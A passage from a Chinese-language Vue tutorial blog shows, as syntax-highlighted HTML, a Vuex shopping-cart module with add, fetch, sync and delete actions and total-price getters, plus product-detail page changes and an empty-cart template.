#9CDCFE">goods_num</span><span style="color: #D4D4D4"> += </span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 如果不存在，则添加到购物车列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addCart</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"getCartAction"</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 重新拉取购物车信息</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"添加成功"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 异步获取购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCartAction</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">data</span><span style="color: #D4D4D4"> } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCartList</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 由于后台返回数据中不包括是否选中的状态，所以本地自己维护，给每一项添加上被选中的状态</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">element</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">element</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"setCartList"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 将本地购物车列表同步到服务器（结算或者离开购物车页面立刻同步）</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">syncCartAction</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 接口只接受三个参数：goodsId、goodsNum、goodsSkuId，所以需要遍历本地购物车列表，将选中的商品拆分为三个参数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">paramsObj</span><span style="color: #D4D4D4"> = {};</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_sku_id</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #DCDCAA">updateCart</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">paramsObj</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(paramsObj)</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 删除选中的商品</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">delSelCartA</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 获取选中的商品id然后进行删除</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">ids</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">map</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(ids)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">deleteSelected</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">ids</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"删除成功"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 删除后重新拉取购物车数据</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">context</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"getCartAction"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">getters:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 求所有的商品累加总数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">countCartTotal</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">        (</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">      );</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 选中的商品项目</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">selectedCartList</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// filter只会接收回调结果为true的元素，所以可以不用做其他判断</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">filter</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 选中的商品项目数量</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">selectedCartCount</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 这里的getters可以获取到上面定义的getters</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Array</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">isArray</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        ? </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">            (</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">          )</span></span><span class="line"><span style="color: #D4D4D4">        : </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 选中的商品总价</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">selectedPrice</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// toFixed(2) 保留两位小数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Array</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">isArray</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        ? </span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">selectedCartList</span></span><span class="line"><span style="color: #D4D4D4">            .</span><span style="color: #DCDCAA">reduce</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">              (</span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">sum</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4"> * </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_price_min</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">            )</span></span><span class="line"><span style="color: #D4D4D4">            .</span><span style="color: #DCDCAA">toFixed</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        : </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 是否全选</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">isAllChecked</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// every返回true，说明数组中每一项都为true，否则为false</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">every</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isChecked</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>商品详情页增加：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">mapGetters</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">mapActions</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'vuex'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"><span style="color: #C8C8C8">computed</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart'</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">'countCartTotal'</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart'</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">'getCartAction'</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">detailId</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">params</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 此为created内</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">while</span><span style="color: #D4D4D4"> ((</span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">regex</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">exec</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">htmlString</span><span style="color: #D4D4D4">)) !== </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">srcArray</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">match</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">]) </span><span style="color: #6A9955">// 将匹配到的 src URL 添加到数组中</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">imgSrcArray</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">srcArray</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(this.imgSrcArray) // 输出结果数组</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 异步获取购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getCartAction</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取购物车商品总数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartTotal</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">countCartTotal</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(this.cartTotal)</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 说明有token，可以直接加入购物车</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">obj</span><span style="color: #D4D4D4"> = { </span><span style="color: #6A9955">// 此为添加到购物车的点击事件</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsId:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detailId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsNum:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addCount</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">goodsSkuId:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsSkuId</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Cart/addCartAction'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">obj</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 获取购物车商品总数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartTotal</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">countCartTotal</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">$toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'加入购物车成功！'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showPannel</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 关闭弹层</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C8C8C8">watch</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 监听 countCartTotal 的变化，自动更新 cartTotal</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">countCartTotal</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">newVal</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartTotal</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">newVal</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><h3 id="空购物车处理"><a class="markdownIt-Anchor" href="#空购物车处理"></a> 空购物车处理</h3><p>将除标题以外的盒子用大盒子包裹起来：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cart"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"购物车"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">fixed</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 判断登录，且购物车列表不为空才渲染 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">isLogin</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">...</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 未登录或购物车列表为空时渲染提示页面 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-empty</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">description</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"空空如也，快去逛逛吧~"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-button</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">round</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"danger"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"bottom-button"</span></span><span class="line"><span style="color: #D4D4D4">        @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/home'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">去逛逛</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-button</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-empty</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: 